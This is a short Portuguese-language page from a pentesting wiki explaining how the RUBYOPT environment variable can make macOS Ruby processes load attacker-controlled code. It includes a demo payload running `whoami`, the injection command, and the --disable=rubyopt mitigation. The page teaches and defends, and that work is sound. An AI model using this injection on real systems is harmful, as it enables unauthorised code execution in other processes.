# Injeção em Aplicações Ruby do macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

O Ruby analisa as opções de linha de comando compatíveis a partir da variável de ambiente `RUBYOPT` antes de executar um script. Embora o Ruby rejeite algumas opções nesse contexto, `-I` pode adicionar um diretório de pesquisa de bibliotecas, e `-r` pode exigir uma biblioteca. Portanto, um processo que inicia o Ruby com variáveis de ambiente controladas pelo atacante pode ser induzido a carregar código Ruby controlado pelo atacante.<sup>[[1]](#references)</sup>

Crie `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Crie um script Ruby benigno, como `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Execute-o com um valor controlado de `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Para desativar esse comportamento, passe `--disable=rubyopt` (ou `--disable-rubyopt`) **antes** do nome do script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Uma opção escrita após `hello.rb` é passada ao script em `ARGV`; ela não desativa o processamento anterior de `RUBYOPT` pelo Ruby.<sup>[[1]](#references)</sup>

## References

- [1] [Documentação do Ruby - Opções de linha de comando do Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
